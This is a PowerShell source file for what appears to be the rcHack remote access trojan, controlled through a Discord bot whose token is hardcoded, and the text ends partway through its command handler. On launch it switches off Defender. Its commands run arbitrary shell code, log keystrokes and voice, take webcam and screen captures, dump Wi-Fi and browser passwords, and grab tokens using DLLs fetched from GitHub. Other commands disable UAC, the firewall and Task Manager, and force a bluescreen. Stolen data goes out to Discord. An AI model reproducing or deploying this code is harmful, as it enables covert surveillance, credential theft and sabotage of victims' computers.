Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

#your bot token goes here
#EXAMPLE: $token = "MTA0ODE4MjEwMTA1MTQ2MDM3.AJif8F.9Uod-6ND1QAO38pwPJ7Ishvu5Eb"
$token = "MTI2NTM4OTcyMjcyOTk3MTgwMw.Ghd7Xi.pYHS-jcwjm3vSMvPK62-Mh4jVV-W_O7TCbYjiY"

#your server id goes here
#example: $guildId = "1199929856564584245"
$guildId = "1202664047347236905"

#put the url to your rcHack script (for persistance)
#you can host the file on github (make sure the repository is public)
#example: $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"
$StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"








$channel_id = $null
$last_message_id = $null
$global:dir = "$Env:USERPROFILE\Desktop"
$highestSession = $null
$adminState = $null
$uri = "https://discord.com/api/guilds/$guildId/channels"

$headers = @{
    "Authorization" = "Bot $token"
}

$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Authorization", "Bot $token")
$response = $webClient.DownloadString($uri)
$channels = $response | ConvertFrom-Json
$highestSession = 0
foreach ($channel in $channels) {
    if ($channel.name -match "session-(\d+)") {
        $sessionNumber = [int]$matches[1]
        if ($sessionNumber -gt $highestSession) {
            $highestSession = $sessionNumber
        }
    }
}




#get channels to determine new channel name
$uri = "https://discord.com/api/guilds/$guildId/channels"

$headers = @{
    "Authorization" = "Bot $token"
}

$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Authorization", "Bot $token")
$response = $webClient.DownloadString($uri)
$channels = $response | ConvertFrom-Json
$highestSession = 0
foreach ($channel in $channels) {
    if ($channel.name -match "session-(\d+)") {
        $sessionNumber = [int]$matches[1]
        if ($sessionNumber -gt $highestSession) {
            $highestSession = $sessionNumber
        }
    }
}
$highestSession




#create new channel
$newSessionNumber = $highestSession + 1;
$uri = "https://discord.com/api/guilds/$guildId/channels"
$body = @{
    "name" = "session-$newSessionNumber"
    "type" = 0
} | ConvertTo-Json

$headers = @{
    "Authorization" = "Bot $token"
    "Content-Type" = "application/json"
}

$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Authorization", "Bot $token")
$webClient.Headers.Add("Content-Type", "application/json")

$response = $webClient.UploadString($uri, "POST", $body)
$responseObj = ConvertFrom-Json $response
Write-Host "The ID of the new channel is: $($responseObj.id)"
$channel_id = $responseObj.id;


#function to delete the channel
function Delete-Channel {
$baseUrl = "https://discord.com/api/v9"
$endpoint = "/channels/$channel_id"
$url = $baseUrl + $endpoint
$client = New-Object System.Net.WebClient
$client.Headers.Add("Authorization", "Bot $token")
$response = $client.UploadString($url, "DELETE", "")
Exit
}


#function to send messages back to discord
function Send-Discord {
    param(
        [string]$Message,
        [string]$AttachmentPath
    )

    $url = "https://discord.com/api/v9/channels/$channel_id/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")

    if ($Message) {
        $limitedMessage = $Message
        if ($Message.Length -gt 1900) {
            $limitedMessage = $Message.Substring(0, 1900)
        }
        $jsonBody = @{
            content = $limitedMessage
        } | ConvertTo-Json
        $webClient.Headers.Add("Content-Type", "application/json")
        $response = $webClient.UploadString($url, "POST", $jsonBody)
        Write-Host "Message sent to Discord: $limitedMessage"
    }

    if ($AttachmentPath) {
        if (Test-Path $AttachmentPath -PathType Leaf) {
        $response = $webClient.UploadFile($url, "POST", $AttachmentPath)
        Write-Host "Attachment sent to Discord: $AttachmentPath"
        Remove-Item $AttachmentPath -Force
        Write-Host "Attachment file deleted: $AttachmentPath"
    } else {
        Write-Host "File not found: $AttachmentPath"
        Send-Discord ('File not found: `' + $AttachmentPath + '`')
    }
    }

    $webClient.Dispose()
}



if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    $adminState = "False"
    } else {
    $adminState = "True"
    }





#DiscordCommands
function DiscordCommand {
    param(
        [string]$DiscordCommandName,
        [string]$param
    )

    switch ($DiscordCommandName) {
        "cmd" {
    $result = Invoke-Expression "cmd /c $param"
    $output = $result -join "`n"
    Write-Host $output
    Send-Discord $output
}
        "powershell" { 
    $result = Invoke-Expression $param
    $output = $result -join "`n"
    Write-Host $output
    Send-Discord $output
}
        "dir"{
    $output = @()
    $items = Get-ChildItem -Path $global:dir
    $output += "Directory: $($global:dir)`n"
    foreach ($item in $items) {
    if ($item.PSIsContainer) {
    $output += "FOLDER - $($item.Name)"
    } else {
    $output += "FILE - $($item.Name)"}}
    Write-Host ($output -join "`n")
    Send-Discord ($output -join "`n")
}
        "cd" {
    $param = $param -replace '/', '\'
    if (Test-Path $param -PathType Container) {
    $global:dir = $param
    Write-Host "Changed current directory to $param"
    Send-Discord ('Changed current directory to `' + $param + '`')
    } elseif (Test-Path $param -PathType Leaf) {
    Write-Host "'$param' is not a directory."
    Send-Discord ('`' + $param + '` is not a directory.')
    } else {
    $fullPath = Join-Path -Path $global:dir -ChildPath $param
    if (Test-Path $fullPath -PathType Container) {
    $global:dir = $fullPath
    Write-Host "Changed current directory to $param"
    Send-Discord ('Changed current directory to `' + $param + '`')
    } elseif (Test-Path $fullPath -PathType Leaf) {
    Write-Host "'$fullPath' is not a directory."
    Send-Discord ('`' + $param + '` is not a directory.')
    } else {
    Write-Host "Directory '$fullPath' does not exist."
    Send-Discord ("Directory `'$fullPath`' does not exist.")}}
}
        "download" {
    if (Test-Path $param -PathType Leaf) {
    $fullPath = $param
    } else {
    $fullPath = Join-Path -Path $global:dir -ChildPath $param}
    if (Test-Path $fullPath -PathType Leaf) {
    Write-Host $fullPath
    Send-Discord -Attachment $fullPath
    } else {
    Write-Host "File location does not exist or is not a file."
    Send-Discord "File location does not exist or is not a file."}
}
        "upload" {
    $fileName = [System.IO.Path]::GetFileName($param) -replace '[?&].*'
    $outputPath = Join-Path -Path $global:dir -ChildPath $fileName
    Invoke-WebRequest -Uri $param -OutFile $outputPath  -UseBasicParsing
    if (Test-Path $outputPath) {
    Write-Host "File uploaded."
    } else {
    Write-Host "Unknown error, most likely failed."}
}
        "delete"{
            $param = $param -replace '/', '\'
            if (Test-Path $param -PathType Leaf) {
                $fullPath = $param
            } else {
                $fullPath = Join-Path -Path $global:dir -ChildPath $param
            }
            
            if (Test-Path $fullPath) {
                if (Test-Path $fullPath -PathType Leaf) {
                    Remove-Item -Path $fullPath -Force
                    Write-Host "File deleted: $fullPath"
                    Send-Discord "File deleted: $fullPath"
                } elseif (Test-Path $fullPath -PathType Container) {
                    Remove-Item -Path $fullPath -Recurse -Force
                    Write-Host "Directory deleted: $fullPath"
                    Send-Discord "Directory deleted: $fullPath"
                } else {
                    Write-Host "The path $fullPath does not point to a file or directory."
                    Send-Discord "The path $fullPath does not point to a file or directory."
                }
            } else {
                Write-Host "File location does not exist: $fullPath"
                Send-Discord "File location does not exist: $fullPath"
            }
            
}
        "availwifi" {
    $wifiNetworks = netsh wlan show networks mode=Bssid | Select-String "SSID|Signal|Authentication|Cipher" | ForEach-Object { $_.ToString() }
    Write-Host ($wifiNetworks -join "`n")
    Send-Discord ($wifiNetworks -join "`n")
}
        "wifipass" {
    $wifipass = (netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" } | ForEach-Object { netsh wlan show profiles $_ key=clear | Select-String "SSID name", "Key Content" }) -join "`n"
    Write-Host $wifipass
    Send-Discord $wifipass
}
        "screenshot" {
    $File = "$env:TEMP\screenshot.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top        
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)
    Write-Host $File
    Send-Discord -AttachmentPath $File
}     
        "webcampic"{
    $dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
    if (-not (Test-Path $dllPath)) {
    $url = "https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/Webcam.dll"
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $dllPath)}
    Add-Type -Path $dllPath
    [Webcam.webcam]::init()
    [Webcam.webcam]::select(1)
    $imageBytes = [Webcam.webcam]::GetImage()
    $tempDir = [System.IO.Path]::GetTempPath()
    $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
    [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
    Write-Host $imagePath
    Send-Discord -Attachment $imagePath
}
        "wallpaper"{
    $setwallpapersrc = @"
    using System;
    using System.Net;
    using System.Runtime.InteropServices;
    public class Wallpaper{
    public const int SetDesktopWallpaper = 20;
    public const int UpdateIniFile = 0x01;
    public const int SendWinIniChange = 0x02;
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void SetWallpaperFromUrl(string url){
    using (WebClient client = new WebClient()){
    string tempFilePath = System.IO.Path.GetTempFileName();
    client.DownloadFile(url, tempFilePath);
    SystemParametersInfo(SetDesktopWallpaper, 0, tempFilePath, UpdateIniFile | SendWinIniChange);}}}
"@
    Add-Type -TypeDefinition $setwallpapersrc
    [Wallpaper]::SetWallpaperFromUrl($param)
}
        "keylogger" {
    $ScriptBlock = {
    param($Path = "$env:temp\KeyLog.txt")
    function Start-KeyLogger {
    param (
    [string]$Path)
    $signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    if ($null -eq $API) {
    Write-Host "Failed to initialize API.Win32. Keylogger cannot be started."
    return}
    while ($true) {
    Start-Sleep -Milliseconds 40
    for ($ascii = 9; $ascii -le 254; $ascii++) {
    $state = $API::GetAsyncKeyState($ascii)
    if ($state -eq -32767) {
    $null = [console]::CapsLock
    $virtualKey = $API::MapVirtualKey($ascii, 3)
    $kbstate = New-Object Byte[] 256
    $checkkbstate = $API::GetKeyboardState($kbstate)
    $mychar = New-Object -TypeName System.Text.StringBuilder
    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
    if ($success) {
    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}}}
    Start-KeyLogger -Path $Path}
    Start-Job -ScriptBlock $ScriptBlock -ArgumentList "$env:temp\KeyLog.txt"
    Write-Host "Keylogger started."
    Send-Discord "Keylogger started."
}
        "getkeylog"{
    Write-Host (Join-Path $env:temp 'Keylog.txt')
    Send-Discord -Attachment (Join-Path $env:temp 'Keylog.txt')
}
        "voicelogger"{
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/voicelogger.ps1' | iex}`"" -WindowStyle Hidden
    Write-Host "Voice logger started."        
    Send-Discord "Voice logger started."
}
        "getvoicelog"{
    Write-Host (Join-Path $env:temp 'VoiceLog.txt')
    Send-Discord -Attachment (Join-Path $env:temp 'VoiceLog.txt')
}
        "disabledefender" {
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Write-Host "Requires admin."
    Send-Discord "Requires admin."
    } else {
#disable realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue

#disable uac
    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
    #disable tamper protection
while ($true) {
    # Check if Tamper Protection is enabled
    if ((Get-MpComputerStatus).IsTamperProtected) {
        # if Tamper Protection is enabled, perform actions

        $shell = New-Object -ComObject WScript.Shell
        $shell.SendKeys("^{ESC}")
        Start-Sleep -Seconds 1
        $shell.SendKeys("Tamper Protection")
        Start-Sleep -Seconds 2
        $shell.SendKeys("{ENTER}")
        Start-Sleep -Seconds 4
        1..4 | ForEach-Object {
            $shell.SendKeys("{TAB}")
            Start-Sleep -Milliseconds 200
        }
        $shell.SendKeys(" ")
        Start-Sleep -Seconds 1
        $shell.SendKeys("{RIGHT}")
        $shell.SendKeys("%y")
        $shell.SendKeys("{ENTER}")
        $shell.SendKeys("%{F4}")
        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtection /t REG_DWORD /d 4 /f" -Verb RunAs -Wait
        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v TamperProtectionSource /t REG_DWORD /d 2 /f" -Verb RunAs -Wait
        Start-Process -FilePath "reg.exe" -ArgumentList "add 'HKLM\SOFTWARE\Microsoft\Windows Defender\Features' /v SenseDevMode /t REG_DWORD /d 0 /f" -Verb RunAs -Wait

        Write-Host "Tamper Protection is enabled."
    } else {
        # if Tamper Protection is disabled, break the loop
        Write-Host "Tamper Protection is not enabled."
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/disabledefender.ps1' | iex}`"" -WindowStyle Hidden
        break
    }
Send-Discord "Command executed."
}
}
}
        "disablefirewall" {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Write-Host "Requires admin."
    Send-Discord "Requires admin."
    } else {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Write-Host "Command executed."
    Send-Discord "Command executed."}
    }
        "shutdown"{
    Write-Host "Shutting down."
    Send-Discord "Shutting down."
    Stop-Computer -Force
}
        "restart"{
    Write-Host "Restarting."
    Send-Discord "Restarting."
    Restart-Computer -Force
}
        "logoff"{
    Write-Host "Logging off."
    Send-Discord "Logging off."
    shutdown.exe /l
}
        "msgbox" {
    $paramsArray = $param -split ','
    $title = $paramsArray[0]
    $message = $paramsArray[1]
    $icon = $paramsArray[2]
    $buttons = $paramsArray[3]
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    [System.Windows.Forms.MessageBox]::Show($message, $title, [System.Windows.Forms.MessageBoxButtons]::$buttons, [System.Windows.Forms.MessageBoxIcon]::$icon) | Out-Null
    Write-Host "Message box for '$title' displayed."
    Send-Discord ("Message box for `'$title`' displayed.")
}
        "hackergoose"{
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb 'https://raw.githubusercontent.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/main/HackerGoose.ps1' | iex}`"" -WindowStyle Hidden
    Write-Host "Hacker goose starting."        
    Send-Discord "Hacker goose starting."
}
        "website"{
    function Open-Website {
    param(
    [string]$url)
    $chromePath = Get-DiscordCommand "chrome.exe" -ErrorAction SilentlyContinue
    if ($chromePath) {
    Start-Process "chrome.exe" -ArgumentList $url
    } else {
    Start-Process $url}}
    Open-Website -url $param
    Write-Host "Command executed."        
    Send-Discord "Command executed."
}
        "minapps"{
    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
    Write-Host "Command executed."
    Send-Discord "Command executed."
}
        "ip" {
    $ip = (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
    Write-Host $ip
    Send-Discord ``$ip``
}
        "passwords"{
            # Define the function to retrieve passwords
function Get-Password {
    # Define the URLs for password grabbing assemblies
    $dllUrls = @{
        "password" = "https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/PasswordStealer.dll"
    }
    
    # Define the dictionary to hold loaded assemblies
    $dllHolder = @{}

    # Function to load assemblies
    function Load-Dll {
        param(
            [string]$name,
            [byte[]]$data
        )
        $dllHolder[$name] = [System.Reflection.Assembly]::Load($data)
    }

    # Function to retrieve passwords
    function Retrieve-Passwords {
        if (-not $dllHolder.ContainsKey("password")) {
            Load-Dll -name "password" -data (Invoke-WebRequest -Uri $dllUrls["password"] -UseBasicParsing).Content
        }

        $instance = New-Object -TypeName $dllHolder["password"].GetType("PasswordStealer.Stealer")
        $runMethod = $instance.GetType().GetMethod("Run")

        $passwords = $runMethod.Invoke($instance, @())
        return $passwords
    }

    # Call the function to retrieve passwords
    return Retrieve-Passwords
}
    $passwords = Get-Password
    Set-Content -Path "$env:TEMP\passwords.txt" -Value $passwords
    Write-Host "$env:TEMP\passwords.txt"
    Send-Discord -Attachment "$env:TEMP\passwords.txt"
}
        "tokengrabber"{
$dllUrl = "https://raw.githubusercontent.com/6uard1an/rcHack/main/resources/Token%20grabber.dll"
$dllPath = "$env:TEMP\TokenGrabber.dll"
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath
Add-Type -Path $dllPath
$tokens = [Token_grabber.grabber]::grab()
foreach ($token in $tokens) {
    Write-Host $token
    Send-Discord $token
}

        }
        "browserdata"{
    function Get-BrowserData {
    [CmdletBinding()]
    param (
    [Parameter(Position=1, Mandatory = $True)]
    [string]$Browser,    
    [Parameter(Position=2, Mandatory = $True)]
    [string]$DataType) 
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
    $Key = $_
    New-Object -TypeName PSObject -Property @{
    User = $env:UserName
    Browser = $Browser
    DataType = $DataType
    Data = $_}}}
    $filePath = "$env:TEMP\browserdata.txt"
    Get-BrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "opera" -DataType "history" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "opera" -DataType "bookmarks" | Out-File -Append -FilePath $filePath
    Write-Host $filePath
    Send-Discord -Attachment $filePath
}
        "networkscan"{
# Get all the IP addresses on the network
$ipAddresses = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" } | Select-Object -ExpandProperty IPAddress

# Create an array to store device information
$deviceInfoList = @()

foreach ($ipAddress in $ipAddresses) {
    $pingResult = Test-Connection -ComputerName $ipAddress -Count 1 -ErrorAction SilentlyContinue
    if ($pingResult) {
        $deviceInfo = @{
            IPAddress   = $ipAddress
            Online      = $true
            HostName    = $pingResult.Address
            DeviceType  = $null
            Model       = $null
            OS          = $null
            # Add more fields as needed
        }

        # Try to resolve additional device information
        $dnsResult = Resolve-DnsName -Name $ipAddress -ErrorAction SilentlyContinue
        if ($dnsResult) {
            $deviceInfo.DeviceType = $dnsResult.QueryType
            # Extract more information from $dnsResult if needed
        }

        # Get device name and operating system information
        $sysInfo = Get-WmiObject Win32_ComputerSystem -ComputerName $deviceInfo.IPAddress -ErrorAction SilentlyContinue
        if ($sysInfo) {
            $deviceInfo.Model = $sysInfo.Model
            $deviceInfo.OS = $sysInfo.Caption
            # Add more fields as needed
        }

        # Add the device information to the list
        $deviceInfoList += New-Object PSObject -Property $deviceInfo
    } else {
        $deviceInfo = @{
            IPAddress   = $ipAddress
            Online      = $false
            HostName    = "N/A"
            DeviceType  = $null
            Model       = $null
            OS          = $null
            # Add more fields as needed
        }

        # Add the device information to the list
        $deviceInfoList += New-Object PSObject -Property $deviceInfo
    }
}

# Save the output to a file
$outputPath = Join-Path -Path $env:TEMP -ChildPath "networkscan.txt"
$deviceInfoList | Format-Table -AutoSize | Out-File -FilePath $outputPath

Write-Host $outputPath
Send-Discord -Attachment $outputPath

}
        "volume"{
    Function Set-Volume{
    Param(
    [Parameter(Mandatory=$true)]
    [ValidateRange(0,100)]
    [Int]
    $volume)
    $keyPresses = [Math]::Ceiling( $volume / 2 )
    $obj = New-Object -ComObject WScript.Shell
    1..50 | ForEach-Object {  $obj.SendKeys( [char] 174 )  }
    for( $i = 0; $i -lt $keyPresses; $i++ ){
    $obj.SendKeys( [char] 175 )}}
    Set-Volume $param
    Write-Host "Command executed."
    Send-Discord "Command executed."
}
        "voice"{
    Add-Type -AssemblyName System.Speech
    function Speak-Text($text) {
    $synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $synthesizer.Speak($text)
    $synthesizer.Dispose()}
    Speak-Text -text $param
    Write-Host "Voice command executed."        
    Send-Discord "Voice command executed."
}
        "proclist"{
    $processNames = Get-Process | Select-Object -Unique ProcessName | ForEach-Object { "$($_.ProcessName)`n" }
    Write-Host $($processNames -join '')
    Send-Discord $($processNames -join '')
}
        "prockill"{
    Get-Process -Name $param | Stop-Process -Force
    Write-Host "Command executed."
    Send-Discord "Command executed."
}
        "write"{
    function SimulateTyping {
    param(
    [string]$param)
    $wshell = New-Object -ComObject WScript.Shell
    $wshell.SendKeys($param)}
    SimulateTyping $param
    Write-Host "Command executed."        
    Send-Discord "Command executed."
}
        "clipboard"{
    Write-Host (Get-Clipboard)
    Send-Discord ("'" + (Get-Clipboard) + "'")
}
        "idletime"{
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class User32
    {
    [DllImport("user32.dll", SetLastError=false)]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [StructLayout(LayoutKind.Sequential)]
    public struct LASTINPUTINFO
    {
    public uint cbSize;
    public uint dwTime;
    }
    public static uint GetIdleTime()
    {
    LASTINPUTINFO lii = new LASTINPUTINFO();
    lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
    if (!GetLastInputInfo(ref lii))
    {
    throw new Exception("GetLastInputInfo failed.");
    }
    return (uint)Environment.TickCount - lii.dwTime;
    }
    }
"@
    $idleTime = [User32]::GetIdleTime()
    $idleTimeInSeconds = $idleTime / 1000
    Write-Host "$idleTimeInSeconds seconds"
    Send-Discord ('`' + $idleTimeInSeconds + '` seconds.')
}
        "datetime"{
    Write-Host (Get-Date)
    Send-Discord ("'" + (Get-Date) + "'")
}
        "bluescreen"{
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Write-Host "Requires admin."
    Send-Discord "Requires admin."
    } else {
    function Bluescreen {
    Write-Host "Command executed."
    Send-Discord "Command executed."
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Program
    {
    [DllImport("ntdll.dll")]
    public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
    [DllImport("ntdll.dll")]
    public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    public static void Bluescreen()
    {
    bool flag;
    RtlAdjustPrivilege(19, true, false, out flag);
    uint num;
    NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num);
    }
    }
"@
    [Program]::Bluescreen()}
    Bluescreen
    }
}        "geolocate"{
            try {
                Add-Type -AssemblyName System.Device # Required to access System.Device.Location namespace
                $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
                $GeoWatcher.Start() # Begin resolving current location
                while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
                    Start-Sleep -Milliseconds 100 # Wait for discovery.
                }
                if ($GeoWatcher.Permission -eq 'Denied') {
                    throw "Access Denied for Location Information"
                } else {
                    $location = $GeoWatcher.Position.Location
                    $output = "Latitude: $($location.Latitude), Longitude: $($location.Longitude)"
                }
            } catch {
                $output = "An error occurred: $_ `n`nCould not use built-in geolocation feature.`nAttempting to get geolocation using HTTP."
            }
            
            if ($GeoWatcher.Permission -eq 'Denied') {
                try {
                    $url = "https://ipinfo.io/json"
                    $response = Invoke-RestMethod -Uri $url -Method Get
            
                    $latitude = $response.loc.Split(',')[0]
                    $longitude = $response.loc.Split(',')[1]
            
                    $output += "`nLatitude: $latitude, Longitude: $longitude"
                } catch {
                    $output += "`nAn error occurred while retrieving geolocation using HTTP: $_"
                }
            }
            
            Write-Host $output
            Send-Discord $output
}
        "block"{
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Write-Host "Requires admin."
    Send-Discord "Requires admin."
    } else {
    $signature = @"
    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool BlockInput(bool fBlockIt);
"@
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($true)
    Write-Host "Command executed."
    Send-Discord "Command executed."
    }
}
        "unblock"{
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Write-Host "Requires admin."
    Send-Discord "Requires admin."
    } else {
    $signature = @"
    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool BlockInput(bool fBlockIt);
"@
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($false)
    Write-Host "Command executed."
    Send-Discord "Command executed."
    }
}
        "disabletaskmgr"{
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Write-Host "This script requires administrative privileges to run."
    } else {
    $code = @"
    using Microsoft.Win32;
    public static class DisableTaskmgr{
    public static void DisableTaskManager(){
    using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")){
    if (registryKey.GetValue("DisableTaskMgr") == null){
    registryKey.SetValue("DisableTaskMgr", "1");}}}}
"@
    Add-Type -TypeDefinition $code
    [DisableTaskmgr]::DisableTaskManager()
     Write-Host "Command executed."
    Send-Discord "Command executed."}
    }
        "enabletaskmgr"{
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Write-Host "Requires admin."
    Send-Discord "Requires admin."
    } else {
    $code = @"
    using Microsoft.Win32;
    public static class EnableTaskmgr{
    public static void EnableTaskManager(){
    using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")){
    if (registryKey.GetValue("DisableTaskMgr") != null){
    registryKey.DeleteValue("DisableTaskMgr");}}}}
"@
    Add-Type -TypeDefinition $code
    [EnableTaskmgr]::EnableTaskManager()
    Write-Host "Command executed."
    Send-Discord "Command executed."}
}
        "admin"{
